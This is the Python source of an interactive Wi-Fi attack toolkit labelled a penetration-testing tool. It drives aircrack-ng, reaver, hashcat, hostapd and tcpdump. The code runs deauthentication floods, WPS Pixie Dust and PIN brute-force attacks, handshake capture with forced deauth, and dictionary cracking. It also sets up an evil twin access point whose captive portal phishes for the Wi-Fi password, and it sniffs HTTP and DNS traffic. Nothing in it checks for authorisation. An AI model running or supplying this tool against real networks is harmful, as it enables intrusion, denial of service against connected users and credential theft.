
import sys
import time
import subprocess
import os
import re
import signal
import argparse
from terminaltables import SingleTable

selected_interface = None
current_processes = []

def main():
    display_banner()
    time.sleep(0.5)
    
    check_root_privileges()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    print("Type 'help' for a list of commands or 'exit' to quit")
    
    interfaces = get_wireless_interfaces()
    if interfaces:
        if len(interfaces) == 1:
            global selected_interface
            selected_interface = interfaces[0]
            print(f"\n[+] Auto-selected wireless interface: {selected_interface}")
        else:
            print(f"\n[*] Found {len(interfaces)} wireless interfaces. Use 'select' to choose one.")
    else:
        print("\n[!] No wireless interfaces detected. Are you running in a VM?")
    
    while True:
        try:
            command = input("\n> ").strip().lower()
            
            if command == "exit":
                print("Cleaning up and exiting application...")
                cleanup_and_exit()
                break
            elif command == "help":
                display_help()
            elif command == "scan":
                wifi_scan()
            elif command == "monitor":
                wifi_monitor_mode()
            elif command == "managed":
                wifi_managed_mode()
            elif command == "capture":
                start_wifi_capture()
            elif command == "interfaces" or command == "ifconfig":
                show_interfaces()
            elif command.startswith("select"):
                select_interface(command)
            elif command == "deauth":
                run_deauth()
            elif command == "wps":
                run_wps_attack()
            elif command == "handshake":
                capture_handshake()
            elif command == "crack":
                crack_handshake()
            elif command == "status":
                show_status()
            elif command == "stop":
                stop_all_processes()
            elif command == "evil":
                evil_twin_attack()
            elif command == "sniff":
                wifi_packet_sniffing()
            elif command == "clear" or command == "cls":
                os.system('clear')
            else:
                print(f"Command '{command}' not recognized. Type 'help' for available commands.")
        except KeyboardInterrupt:
            print("\n\nUse 'exit' to quit safely or CTRL+C again to force quit")
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                print("\nForce quitting...")
                sys.exit(1)

def signal_handler(sig, frame):
    print("\n\nInterrupt received. Use 'exit' to quit safely or CTRL+C again to force quit")
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        print("\nForce quitting...")
        sys.exit(1)

def check_root_privileges():
    if os.geteuid() != 0:
        print("\n[!] This script requires root privileges to interact with network interfaces")
        print("[!] Please run as root or with sudo")
        sys.exit(1)

def display_banner():
    os.system('clear')
    print(r"""
 _____       _                _   _ _ _                   
/  __ \     | |              | \ | (_) |                  
| /  \/_   _| |__   ___ _ __ |  \| |_| |___  ___ _ __     
| |   | | | | '_ \ / _ \ '__|| . ` | | / __|/ _ \ '_ \    
| \__/\ |_| | |_) |  __/ |   | |\  | | \__ \  __/ | | |   
 \____/\__, |_.__/ \___|_|   \_| \_/_|_|___/\___|_| |_|   
        __/ |                                             
       |___/                                              
  _    _ _  __ _   _____         _ _    _ _   
 | |  | (_)/ _(_) |  _  \       | | |  (_) |  
 | |  | |_| |_ _  | | | |___  __| | | ___| |_ 
 | |/\| | |  _| | | | | / _ \/ _` | |/ / | __|
 \  /\  / | | | | | |/ /  __/ (_| |   <| | |_ 
  \/  \/|_|_| |_| |___/ \___|\__,_|_|\_\_|\__|
                                            
    """)
    time.sleep(0.3)
    print("CyberNilsen's Advanced WiFi Penetration Testing Toolkit")
    print("====================================================")
    print(f"Running on: {os.uname()[1]} - Kali {get_kali_version()}")

def get_kali_version():
    try:
        with open('/etc/os-release', 'r') as f:
            for line in f:
                if line.startswith('VERSION='):
                    return line.split('=')[1].strip().strip('"')
    except:
        return "Linux"
    return "Unknown"

def display_help():
    print("\nAvailable commands:")
    
    commands = [
        ["Command", "Description"],
        ["help", "Display this help message"],
        ["interfaces", "Show available wireless interfaces"],
        ["select", "Select a wireless interface (e.g., 'select wlan0')"],
        ["status", "Show current status and selected interface"],
        ["scan", "Scan for wireless networks with details"],
        ["monitor", "Put wireless interface in monitor mode"],
        ["managed", "Return wireless interface to managed mode"],
        ["capture", "Capture wireless packets (with filtering options)"],
        ["handshake", "Capture WPA handshakes from target networks"],
        ["crack", "Attempt to crack captured handshakes"],
        ["deauth", "Send deauthentication packets to targets"],
        ["wps", "Test for WPS vulnerabilities"],
        ["evil", "Create an evil twin access point"],
        ["sniff", "Sniff wireless traffic for credentials"],
        ["stop", "Stop all running processes"],
        ["clear", "Clear the screen"],
        ["exit", "Exit the application (cleanup on exit)"]
    ]
    
    table = SingleTable(commands)
    table.inner_row_border = True
    print(table.table)

def get_wireless_interfaces():
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=False)
        
        if result.returncode != 0:

            result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=False)
            interfaces = re.findall(r'(\w+)\s+IEEE', result.stdout)
        else:
            interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
        
        return interfaces
    except Exception as e:
        print(f"[!] Error getting wireless interfaces: {e}")
        return []

def show_interfaces():
    print("\n[*] Showing wireless interfaces...")
    
    interfaces = get_wireless_interfaces()
    
    if not interfaces:
        print("[!] No wireless interfaces detected")
        return
    
    interface_data = [["Interface", "Mode", "MAC Address", "Status"]]
    
    for iface in interfaces:

        mode = get_interface_mode(iface)
        mac = get_interface_mac(iface)
        status = "Up" if is_interface_up(iface) else "Down"
        
        interface_data.append([
            f"→ {iface}" if iface == selected_interface else iface,
            mode,
            mac,
            status
        ])
    
    table = SingleTable(interface_data)
    table.inner_row_border = True
    print(table.table)

def get_interface_mode(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True, check=False)
        if "Mode:Monitor" in result.stdout:
            return "Monitor"
        elif "Mode:Managed" in result.stdout:
            return "Managed"
        else:
            mode_match = re.search(r'Mode:(\w+)', result.stdout)
            return mode_match.group(1) if mode_match else "Unknown"
    except:
        return "Unknown"

def get_interface_mac(interface):
    try:
        result = subprocess.run(["macchanger", "-s", interface], capture_output=True, text=True, check=False)
        mac_match = re.search(r'([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})', result.stdout, re.IGNORECASE)
        return mac_match.group(1) if mac_match else "Unknown"
    except:
        return "Unknown"

def is_interface_up(interface):
    try:
        with open(f"/sys/class/net/{interface}/operstate", "r") as f:
            state = f.read().strip()
        return state == "up"
    except:
        return False

def select_interface(command):
    global selected_interface
    
    parts = command.split()
    if len(parts) < 2:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces detected")
            return
            
        print("\nAvailable interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
            
        choice = input("\nSelect interface number (or name): ")
        try:
            if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                selected_interface = interfaces[int(choice) - 1]
            elif choice in interfaces:
                selected_interface = choice
            else:
                print(f"[!] Invalid selection: {choice}")
                return
        except (ValueError, IndexError):
            print("[!] Invalid selection")
            return
    else:
        interface_name = parts[1]
        interfaces = get_wireless_interfaces()
        
        if interface_name in interfaces:
            selected_interface = interface_name
        else:
            print(f"[!] Interface '{interface_name}' not found")
            return
    
    print(f"[+] Selected interface: {selected_interface}")

def check_interface_selected():
    if not selected_interface:
        print("[!] No interface selected. Use 'select' command first.")
        return False
    return True

def wifi_scan():
    if not check_interface_selected():
        return
    
    print(f"\n[*] Scanning for wireless networks using {selected_interface}...")
    
    current_mode = get_interface_mode(selected_interface)
    if current_mode == "Monitor":
        print("[*] Interface is in monitor mode, switching to managed mode for scanning...")
        wifi_managed_mode(silent=True)
        
    subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
    
    try:

        try:
            print("[*] Scanning networks (this may take a few seconds)...")
            result = subprocess.run(
                ["nmcli", "-f", "BSSID,SSID,CHAN,RATE,SIGNAL,SECURITY", "dev", "wifi", "list", "ifname", selected_interface],
                capture_output=True, text=True, check=True
            )
            print("\n" + result.stdout)
        except:

            print("[*] Using iwlist for scanning...")
            result = subprocess.run(["iwlist", selected_interface, "scan"], capture_output=True, text=True, check=False)
            
            networks = []
            current_network = None
            
            for line in result.stdout.splitlines():
                line = line.strip()
                
                if "Cell" in line:
                    if current_network:
                        networks.append(current_network)
                    current_network = {"MAC": line.split("Address: ")[1] if "Address: " in line else "Unknown"}
                elif current_network:
                    if "ESSID:" in line:
                        current_network["SSID"] = line.split('ESSID:"')[1].strip('"')
                    elif "Frequency:" in line:
                        current_network["Channel"] = line.split("Channel ")[1] if "Channel " in line else "?"
                    elif "Quality=" in line:
                        signal_str = line.split("Signal level=")[1].split(" ")[0] if "Signal level=" in line else "?"
                        current_network["Signal"] = signal_str
                    elif "Encryption key:" in line:
                        current_network["Encryption"] = "On" if "on" in line.lower() else "Off"
                    elif "IE: IEEE 802.11i/WPA2" in line:
                        current_network["Security"] = "WPA2"
                    elif "IE: WPA Version 1" in line:
                        current_network["Security"] = "WPA"
            
            if current_network:
                networks.append(current_network)
                
            if networks:
                network_data = [["BSSID", "SSID", "Channel", "Signal", "Security"]]
                
                for net in networks:
                    network_data.append([
                        net.get("MAC", "?"),
                        net.get("SSID", "<hidden>"),
                        net.get("Channel", "?"),
                        net.get("Signal", "?"),
                        net.get("Security", net.get("Encryption", "?"))
                    ])
                
                table = SingleTable(network_data)
                table.inner_row_border = True
                print("\n" + table.table)
            else:
                print("[!] No networks found")
        
    except subprocess.CalledProcessError as e:
        print(f"[!] Error running scan command: {e}")
    
    print("\n[+] Scan complete!")

def wifi_monitor_mode(silent=False):
    global selected_interface  
    
    if not check_interface_selected():
        return
    
    if not silent:
        print(f"\n[*] Putting {selected_interface} in monitor mode...")
    
    try:

        subprocess.run(["airmon-ng", "check", "kill"], check=False)
        
        subprocess.run(["airmon-ng", "start", selected_interface], check=False)
        
        interfaces = get_wireless_interfaces()
        mon_interface = f"{selected_interface}mon"
        
        if mon_interface in interfaces:
            selected_interface = mon_interface
            if not silent:
                print(f"[+] Interface name changed to {mon_interface}")
        
        if get_interface_mode(selected_interface) != "Monitor":

            subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
            subprocess.run(["iw", selected_interface, "set", "monitor", "none"], check=False)
            subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
            
        if not silent:
            if get_interface_mode(selected_interface) == "Monitor":
                print(f"[+] {selected_interface} is now in monitor mode!")
            else:
                print(f"[!] Failed to put {selected_interface} in monitor mode")
    
    except Exception as e:
        print(f"[!] Error setting monitor mode: {e}")

def wifi_managed_mode(silent=False):
    global selected_interface 
    
    if not check_interface_selected():
        return
    
    if not silent:
        print(f"\n[*] Putting {selected_interface} back in managed mode...")
    
    try:

        original_interface = selected_interface.replace("mon", "") if selected_interface.endswith("mon") else selected_interface
        
        subprocess.run(["airmon-ng", "stop", selected_interface], check=False)
        
        interfaces = get_wireless_interfaces()
        
        if original_interface in interfaces:
            selected_interface = original_interface
            if not silent:
                print(f"[+] Interface name changed back to {original_interface}")
        
        if get_interface_mode(selected_interface) != "Managed":

            subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
            subprocess.run(["iw", selected_interface, "set", "type", "managed"], check=False)
            subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
            
        subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
        
        if not silent:
            if get_interface_mode(selected_interface) == "Managed":
                print(f"[+] {selected_interface} is now in managed mode!")
            else:
                print(f"[!] Failed to put {selected_interface} in managed mode")
    
    except Exception as e:
        print(f"[!] Error setting managed mode: {e}")

def start_wifi_capture():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Starting wireless packet capture with {selected_interface}...")
    
    print("\nCapture Options:")
    print("1. Capture all traffic")
    print("2. Filter by channel")
    print("3. Filter by BSSID (AP MAC)")
    print("4. Advanced filtering")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    command = ["airodump-ng"]
    
    if choice == "2":
        channel = input("Enter channel number: ").strip()
        command.extend(["-c", channel])
    elif choice == "3":
        bssid = input("Enter AP MAC address: ").strip()
        command.extend(["--bssid", bssid])
    elif choice == "4":
        print("\nAvailable filters:")
        print("Channel (-c)")
        print("BSSID (--bssid)")
        print("Write to file (-w)")
        print("Example: -c 6 --bssid 00:11:22:33:44:55 -w capture")
        
        filters = input("\nEnter filters: ").strip()
        command.extend(filters.split())
    
    save_option = input("\nSave capture to file? (y/n) [n]: ").strip().lower() or "n"
    if save_option == "y":
        filename = input("Enter filename (without extension): ").strip() or "wifi_capture"
        command.extend(["-w", filename])
    
    command.append(selected_interface)
    
    print(f"\n[*] Running: {' '.join(command)}")
    print("[*] Press Ctrl+C to stop capturing")
    print("[*] Starting capture...")
    
    try:
        process = subprocess.Popen(command)
        current_processes.append(("airodump-ng", process))
        process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping packet capture...")
    except Exception as e:
        print(f"[!] Error during packet capture: {e}")
    finally:
        stop_process("airodump-ng")
        print("[+] Packet capture stopped")

def run_deauth():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up deauthentication attack using {selected_interface}...")
    
    ap_mac = input("Enter AP MAC address: ").strip()
    if not ap_mac:
        print("[!] AP MAC address is required")
        return
    
    client_mac = input("Enter client MAC address (leave blank for all clients): ").strip()
    
    packet_count = input("Enter number of deauth packets to send (0 for continuous) [0]: ").strip() or "0"
    
    delay = input("Enter delay between packets in ms (25-1000) [0]: ").strip() or "0"
    
    command = ["aireplay-ng", "--deauth", packet_count, "-a", ap_mac]
    
    if client_mac:
        command.extend(["-c", client_mac])
    
    command.append(selected_interface)
    
    print(f"\n[*] Running: {' '.join(command)}")
    print("[*] Press Ctrl+C to stop the attack")
    print("[*] Starting deauth attack...")
    
    try:
        if int(delay) > 0:
            while True:
                subprocess.run(command, check=False)
                time.sleep(int(delay) / 1000)
        else:
            process = subprocess.Popen(command)
            current_processes.append(("aireplay-ng", process))
            process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping deauth attack...")
    except Exception as e:
        print(f"[!] Error during deauth attack: {e}")
    finally:
        stop_process("aireplay-ng")
        print("[+] Deauth attack stopped")

def run_wps_attack():
    if not check_interface_selected():
        return
    
    print(f"\n[*] Setting up WPS vulnerability scan using {selected_interface}...")
    
    if get_interface_mode(selected_interface) != "Managed":
        print("[*] Interface is not in managed mode, switching now...")
        wifi_managed_mode()
    
    print("\nWPS Attack Options:")
    print("1. Scan for WPS-enabled networks (wash)")
    print("2. Pixie Dust attack (reaver)")
    print("3. Brute force PIN (reaver)")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    try:
        if choice == "1":
            print("\n[*] Scanning for WPS-enabled networks...")
            process = subprocess.Popen(["wash", "-i", selected_interface])
            current_processes.append(("wash", process))
            process.wait()
        
        elif choice == "2":
            target_bssid = input("Enter target AP MAC address: ").strip()
            print("\n[*] Running Pixie Dust attack...")
            process = subprocess.Popen([
                "reaver", "-i", selected_interface, "-b", target_bssid, 
                "-K", "1", "-vv"  
            ])
            current_processes.append(("reaver", process))
            process.wait()
            
        elif choice == "3":
            target_bssid = input("Enter target AP MAC address: ").strip()
            print("\n[*] Running WPS PIN brute force...")
            process = subprocess.Popen([
                "reaver", "-i", selected_interface, "-b", target_bssid, 
                "-vv"  
            ])
            current_processes.append(("reaver", process))
            process.wait()
            
    except KeyboardInterrupt:
        print("\n[*] Stopping WPS attack...")
    except Exception as e:
        print(f"[!] Error during WPS attack: {e}")
    finally:
        stop_process("wash")
        stop_process("reaver")
        print("[+] WPS attack stopped")

def capture_handshake():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up WPA handshake capture using {selected_interface}...")
    
    print("[*] Scanning for networks first...")
    scan_process = subprocess.Popen(["airodump-ng", selected_interface])
    current_processes.append(("airodump-ng-scan", scan_process))
    
    try:
        print("\n[*] Press Ctrl+C when you see your target network")
        scan_process.wait()
    except KeyboardInterrupt:
        stop_process("airodump-ng-scan")
    
    target_bssid = input("\nEnter target AP MAC address: ").strip()
    if not target_bssid:
        print("[!] AP MAC address is required")
        return
    
    target_channel = input("Enter target channel: ").strip()
    if not target_channel:
        print("[!] Channel is required")
        return
    
    output_file = input("Enter output filename (without extension) [handshake]: ").strip() or "handshake"
    
    print(f"\n[*] Starting targeted capture on {target_bssid} (Channel {target_channel})...")
    capture_cmd = [
        "airodump-ng", 
        "--bssid", target_bssid,
        "--channel", target_channel,
        "-w", output_file,
        selected_interface
    ]
    
    capture_process = subprocess.Popen(capture_cmd)
    current_processes.append(("airodump-ng-capture", capture_process))
    
    deauth_option = input("\nRun deauth attack to force handshake? (y/n) [y]: ").strip().lower() or "y"
    
    if deauth_option == "y":
        deauth_cmd = [
            "aireplay-ng",
            "--deauth", "5",
            "-a", target_bssid,
            selected_interface
        ]
        
        try:
            print("\n[*] Sending deauth packets to capture handshake...")
            subprocess.run(deauth_cmd, check=False)
            
            print("\n[*] Waiting for handshake to be captured...")
            print("[*] Press Ctrl+C when you see 'WPA Handshake' or to stop capturing")
            capture_process.wait()
        except KeyboardInterrupt:
            print("\n[*] Stopping handshake capture...")
        finally:
            stop_process("airodump-ng-capture")
            print(f"\n[+] Handshake may have been captured to {output_file}-01.cap")
            print("[*] You can use the 'crack' command to attempt to crack it")

def crack_handshake():
    print("\n[*] WPA Handshake Cracking")
    
    cap_file = input("Enter path to capture file (.cap): ").strip()
    if not os.path.exists(cap_file):
        print(f"[!] File not found: {cap_file}")
        return
    
    wordlist = input("Enter path to wordlist [/usr/share/wordlists/rockyou.txt]: ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        return
    
    print("\nCracking method:")
    print("1. aircrack-ng (faster)")
    print("2. hashcat (GPU, more powerful)")
    
    method = input("\nSelect method [1]: ").strip() or "1"
    
    try:
        if method == "1":
            print(f"\n[*] Starting aircrack-ng with {wordlist}...")
            process = subprocess.Popen(["aircrack-ng", cap_file, "-w", wordlist])
            current_processes.append(("aircrack-ng", process))
            process.wait()
        else:
            hccapx_file = cap_file.replace(".cap", ".hccapx")
            print(f"[*] Converting cap to hashcat format...")
            subprocess.run(["cap2hccapx", cap_file, hccapx_file], check=False)
            
            print(f"[*] Starting hashcat with {wordlist}...")
            process = subprocess.Popen([
                "hashcat", "-m", "2500", hccapx_file, wordlist, 
                "--force"  
            ])
            current_processes.append(("hashcat", process))
            process.wait()
    
    except KeyboardInterrupt:
        print("\n[*] Stopping crack attempt...")
    except Exception as e:
        print(f"[!] Error during cracking: {e}")
    finally:
        stop_process("aircrack-ng")
        stop_process("hashcat")
        print("[*] Cracking process stopped")

def evil_twin_attack():
    if not check_interface_selected():
        return
    
    print("\n[*] Evil Twin Access Point Setup")
    print("[!] Warning: This requires a second wireless interface for internet connection")
    
    target_ssid = input("Enter target SSID to clone: ").strip()
    if not target_ssid:
        print("[!] SSID is required")
        return
    
    channel = input("Enter channel [1]: ").strip() or "1"
    
    if get_interface_mode(selected_interface) != "Managed":
        print("[*] Setting interface back to managed mode...")
        wifi_managed_mode()
    
    print(f"\n[*] Creating Evil Twin AP '{target_ssid}' on channel {channel}")
    print("[*] Starting hostapd...")
    
    hostapd_conf = f"""interface={selected_interface}
    driver=nl80211
    ssid={target_ssid}
    hw_mode=g
    channel={channel}
    macaddr_acl=0
    ignore_broadcast_ssid=0
    auth_algs=1
    """
    
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    
    
    hostapd_process = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"])
    current_processes.append(("hostapd", hostapd_process))
    
    print("[*] Setting up DHCP server...")
    
    dnsmasq_conf = f"""interface={selected_interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
    
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    subprocess.run(["ifconfig", selected_interface, "up", "192.168.1.1", "netmask", "255.255.255.0"], check=False)
    
    dnsmasq_process = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"])
    current_processes.append(("dnsmasq", dnsmasq_process))
    
    captive_portal = input("\nSet up a captive portal/phishing page? (y/n) [n]: ").strip().lower() or "n"
    
    if captive_portal == "y":
        print("[*] Setting up captive portal...")

        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING", "-i", selected_interface,
            "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"
        ], check=False)
        
        print("[*] Starting web server...")
        os.makedirs("/tmp/portal", exist_ok=True)
        
        with open("/tmp/portal/index.html", "w") as f:
            f.write(f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_ssid} - Authentication Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 0; }}
        .container {{ width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }}
        h2 {{ color: #333; text-align: center; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }}
        button {{ width: 100%; padding: 10px; background-color: #4285f4; color: white; border: none; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>{target_ssid}</h2>
        <form action="/login" method="post">
            <p>Please enter your WiFi password to reconnect:</p>
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
""")
        
        os.chdir("/tmp/portal")
        http_process = subprocess.Popen(["python3", "-m", "http.server", "80"])
        current_processes.append(("http_server", http_process))
    
    print("\n[+] Evil Twin AP is now running!")
    print("[*] Press Ctrl+C to stop the attack")
    
    try:
        hostapd_process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping Evil Twin AP...")
    finally:
        stop_process("hostapd")
        stop_process("dnsmasq")
        stop_process("http_server")
        
        if captive_portal == "y":
            subprocess.run([
                "iptables", "-t", "nat", "-D", "PREROUTING", "-i", selected_interface,
                "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"
            ], check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
        
        print("[+] Evil Twin AP stopped")

def wifi_packet_sniffing():
    if not check_interface_selected():
        return
    
    if get_interface_mode(selected_interface) != "Monitor":
        print("[*] Interface is not in monitor mode, switching now...")
        wifi_monitor_mode()
    
    print(f"\n[*] Setting up packet sniffing with {selected_interface}...")
    
    print("\nSniffing Options:")
    print("1. General traffic sniffing")
    print("2. Capture HTTP/HTTPS traffic")
    print("3. DNS request monitoring")
    
    choice = input("\nSelect option [1]: ").strip() or "1"
    
    filter_str = ""
    if choice == "2":
        filter_str = "port 80 or port 443"
    elif choice == "3":
        filter_str = "udp port 53"
    
    output_file = input("\nSave capture to file? (leave blank for no): ").strip()
    
    command = ["tcpdump", "-i", selected_interface, "-n"]
    
    if filter_str:
        command.extend(["-v", filter_str])
    
    if output_file:
        command.extend(["-w", output_file])
    
    print(f"\n[*] Running: {' '.join(command)}")
    print("[*] Press Ctrl+C to stop sniffing")
    
    try:
        process = subprocess.Popen(command)
        current_processes.append(("tcpdump", process))
        process.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping packet sniffing...")
    except Exception as e:
        print(f"[!] Error during packet sniffing: {e}")
    finally:
        stop_process("tcpdump")
        print("[+] Packet sniffing stopped")

def show_status():
    print("\n=== Current Status ===")
    
    if selected_interface:
        print(f"Selected Interface: {selected_interface}")
        print(f"Interface Mode: {get_interface_mode(selected_interface)}")
        print(f"MAC Address: {get_interface_mac(selected_interface)}")
        print(f"Status: {'Up' if is_interface_up(selected_interface) else 'Down'}")
    else:
        print("No interface selected")
    
    print("\nRunning Processes:")
    if current_processes:
        for name, process in current_processes:
            if process.poll() is None:  
                print(f"- {name} (PID: {process.pid})")
    else:
        print("- None")

def stop_process(process_name):
    global current_processes
    
    for i, (name, process) in enumerate(current_processes):
        if name == process_name and process.poll() is None: 
            try:
                process.terminate()
                process.wait(timeout=3)
            except:
                process.kill()
            current_processes.pop(i)
            return True
    
    return False

def stop_all_processes():
    print("\n[*] Stopping all running processes...")
    
    if not current_processes:
        print("[*] No processes to stop")
        return
    
    for name, process in current_processes:
        if process.poll() is None: 
            print(f"[*] Stopping {name} (PID: {process.pid})...")
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                process.kill()
    
    current_processes.clear()
    print("[+] All processes stopped")

def cleanup_and_exit():

    stop_all_processes()
    
    if selected_interface and get_interface_mode(selected_interface) == "Monitor":
        print("[*] Restoring interface to managed mode...")
        wifi_managed_mode(silent=True)
    
    print("[*] Restarting network services...")
    subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
    
    print("[+] Cleanup complete, exiting...")
    sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFi Penetration Testing Toolkit")
    parser.add_argument("-i", "--interface", help="Specify wireless interface to use")
    args = parser.parse_args()
    
    if args.interface:
        selected_interface = args.interface
    
    main()